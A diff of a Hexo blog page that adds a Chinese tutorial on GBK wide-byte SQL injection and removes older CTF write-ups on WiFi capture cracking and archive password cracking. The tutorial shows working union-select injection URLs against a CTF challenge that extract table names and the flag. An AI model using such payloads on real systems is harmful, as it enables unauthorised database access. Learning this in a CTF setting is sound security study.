@@ -6,15 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Hexo</title>
+  <title>sql宽字节注入学习 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://yoursite.com/page/3/index.html">
+  <meta name="description" content="首先了解下宽字节注入，宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql宽字节注入学习">
+<meta property="og:url" content="http://yoursite.com/2019/11/17/sql宽字节注入学习/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="首先了解下宽字节注入，宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入">
 <meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-11-17T08:44:13.004Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hexo">
+<meta name="twitter:title" content="sql宽字节注入学习">
+<meta name="twitter:description" content="首先了解下宽字节注入，宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -154,34 +158,72 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-test" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-sql宽字节注入学习" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/06/15/test/">test</a>
+    <h1 class="article-title" itemprop="name">
+      sql宽字节注入学习
     </h1>
   
 
         
-        <a href="/2019/06/15/test/" class="archive-article-date">
-  	<time datetime="2019-06-14T16:41:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-15</time>
+        <a href="/2019/11/17/sql宽字节注入学习/" class="archive-article-date">
+  	<time datetime="2019-11-17T02:26:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-17</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <img src="/2019/06/15/test/ada.jpg" title="this is a simple image">
-<a href="/2019/06/15/test/ada.jpg" title="哈哈">哈哈</a>
-<p><img src="//yoursite.com/2019/06/15/test/ada.jpg" alt></p>
+        <p>首先了解下宽字节注入，宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入</p>
+<a id="more"></a>
+
+<hr>
+<p>先了解一下编码知识</p>
+<h2 id="UTF8"><a href="#UTF8" class="headerlink" title="UTF8"></a>UTF8</h2><p>由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF</p>
+<h2 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h2><p>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象。<br>宽字节注入，主要针对GBK的使用，<br>原理：<br>  宽字节注入是mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）<br>注明：</p>
+<p>GBK编码，它的编码范围是0×8140~0xFEFE(不包括xx7F)，在遇到%df(ascii(223)) &gt;ascii(128)时自动拼接%5c，因此吃掉‘\’，而%27、%20小于ascii(128)的字符就保留了。</p>
+<p>补充：<br>GB2312是被GBK兼容的，它的高位范围是0xA1<del>0xF7，低位范围是0xA1</del>0xFE(0x5C不在该范围内)，因此不能使用编码吃掉%5c。<br>其它的宽字符集也是一样的分析过程，要吃掉%5c，只需要低位中包含正常的0x5c就行了。</p>
+<p>经常用到的url转码</p>
+<pre><code>空格  %20
+&apos;    %27
+\    %5C</code></pre><p>转义函数：<br>addslashes  -使用反斜线引用字符串</p>
+<pre><code>string addslashes(string $str)</code></pre><p>返回字符串，该字符串为了数据库查询语句等的需要，在某些字符前加上反斜线。这些字符是单引号(‘)、双引号(“)、反斜线()与NUL(NULL字符)。<br>如何从addslashes函数逃逸出来？<br>1.\前面再加上一个\（或单数个）。变成\‘,这样\被转义了，’逃出了限制<br>2.把\弄没</p>
+<pre><code>&apos; -&gt; \&apos; -&gt; %5C%27
+%df&apos; -&gt;%df\&apos; -&gt; %df%5C%27</code></pre><hr>
+<h2 id="一道例题"><a href="#一道例题" class="headerlink" title="一道例题"></a>一道例题</h2><p>南邮ctf GBK Injection<br>题目网址：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p>
+<p>这道题，主要是用一个ascii值大于128的字符，放在’前面，使之编码成为一个汉字，例如用%df<br>也就是，%df’ -&gt;%df&#39; -&gt; %df%5C%27</p>
+<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-2%df&apos; union select 1,database()--+          #sae-chinalover数据库名
+http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+  #ctf,ctf2,ctf3,ctf4,gbksqli,news表名
+http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-2%df&apos; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() where table_name=0x63746634 --+ 读列名
+http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-2%df&apos; union select 1,group_concat(flag) from ctf4  --+   读数据得flag</code></pre><hr>
 
       
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -190,16 +232,75 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/06/15/test/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/11/17/sql宽字节注入学习/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2019/11/03/PHP-session反序列化/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">PHP session反序列化</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -219,164 +320,14 @@
 
 
 
-
-  
-    <article id="post-杂项两道writeup" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/06/14/杂项两道writeup/">ctf杂项中 想蹭网先解开密码、隐写2两道writeup</a>
-    </h1>
-  
-
-        
-        <a href="/2019/06/14/杂项两道writeup/" class="archive-article-date">
-  	<time datetime="2019-06-14T09:16:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>##想蹭网先解开密码<br>根据提示，我们只要猜出正确的手机号就能拿到flag<br>并且我们已经知道手机号前七位，只需要猜到后四位<br>使用kali Linux中的工具 crunch 生成密码字典<br>制作1391040开头的11位手机号密码字典 crunch 11 11 0123456789 -t 1391040%%%% -o num11.txt<br>两个11 分别是密码的最小长度和最大长度 num11.txt 是生成的字典名称</p>
-<img src="/2019/06/14/杂项两道writeup/1.jpg" width="1">
-<p>利用aircrack-ng破解密码<br>aircrack-ng -w num11.txt wifi.cap<br> 这里num11.txt是爆破用到的密码字典<br> <img src="/2019/06/14/杂项两道writeup/3.jpg" width="3"><br> <img src="/2019/06/14/杂项两道writeup/2.jpg" width="2"></p>
-<hr>
-<p>##隐写<br>首先用kali中的binwalk分析这个图片，发现有一个rar文件</p>
-<img src="/2019/06/14/杂项两道writeup/11.jpg" width="11">
-<a href="/2019/06/14/杂项两道writeup/11.jpg" title="11">11</a>
-<p>然后用foremost分离，得到一个output文件夹</p>
-<img src="/2019/06/14/杂项两道writeup/22.jpg" width="22">
-<p>接着打开路径 output/zip<br>解压里边的zip压缩包，得到如图两个文件</p>
-<img src="/2019/06/14/杂项两道writeup/33.jpg" width="33">
-<p>然后再次解压里边的flag.rar，却发现需要密码<br>然后回头看一下另一个，是个图片<br>根据提示的图片，知道密码是三个数字<br>三位的数字密码，继续用crunch生成字典<br> crunch 3 3 0123456789 -o 3number.txt<br> <img src="/2019/06/14/杂项两道writeup/提示.jpg" title="提示"><br> <img src="/2019/06/14/杂项两道writeup/4.jpg" width="4"><br> 之后用kali 自带的fcrackzip工具解密，得到解密密码871。<br>fcrack -D -p 3number.txt -u flag.rar -v<br>-D 就是用的字典模式 -p指定起始破解密码 -u这个参数是为了显示密码用 -v是展示更多信息</p>
-<img src="/2019/06/14/杂项两道writeup/5.jpg" width="5">
-<p>输入密码，发现压缩包里还是一张图片</p>
-<p>用HXD打开这张图片，在最下边找到信息f1@g{eTB1IEFyZSBhIGhAY2tlciE=}</p>
-<img src="/2019/06/14/杂项两道writeup/6.jpg" width="6">
-<img src="/2019/06/14/杂项两道writeup/7.jpg" width="7">
-<p>发现中括号里边的是用base64加密的，然后用ascll及进制转换这个工具，得到y0u Are a h@cker!<br>最后得到flag，f1@g{ y0u Are a h@cker!}</p>
-<hr>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/06/14/杂项两道writeup/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-我的第一篇博客文章" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/06/08/我的第一篇博客文章/">最近常用命令行命令</a>
-    </h1>
-  
-
-        
-        <a href="/2019/06/08/我的第一篇博客文章/" class="archive-article-date">
-  	<time datetime="2019-06-08T13:24:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>##Windows下的命令<br>cd..或者cd ..                                  返回文件上一层目录<br>cd/                                       退回根目录<br>cd ../..                                           返回文件上两回目录<br>cd d:                                             切换到D盘<br>cd /                                               跳转到根目录<br>cd path                                          跳转到指定目录<br>cls                                        清除当前屏幕显示<br>dir                                               显示当前目录中的子文件夹与文件<br>exit                                      退出dos命令行</p>
-<p>md  创建目录<br>例：md movie                           在当前目录中创建名为movie的文件夹<br>例：md d:\test\movie                创建d:\test\movie目录</p>
-<p>rd  删除目录<br>例：rd movie // 删除当前目录下的movie空文件夹<br>例：rd /s /q d:\test  // 使用安静模式删除d:\test（除目录本身外，还将删除指定目录下的所有子目录和文件）</p>
-<p>move  移动目录   </p>
-<p>move 1.png d:\test\2.png  // 将当前目录下的1.png移动到d盘test文件夹中，并重命名为2.png （若test中也存在同名的png图片，会询问是否覆盖）</p>
-<hr>
-<p>##Linux下的命令</p>
-<p>tar  zxvf 文件名                           解压tar.gz 类型文件<br> unrar e all.rar                             解压一个名为all的rar型文件<br>rar  a    a.png  a.rar                  将一个名为a的图片压缩为一个名为a的rar文件<br>pwd   查看当前所处目录路径<br>mkdir 文件名   创建一个文件<br>ls                     显示当前目录中的子文件夹与文件</p>
-<hr>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/06/08/我的第一篇博客文章/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -399,8 +350,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
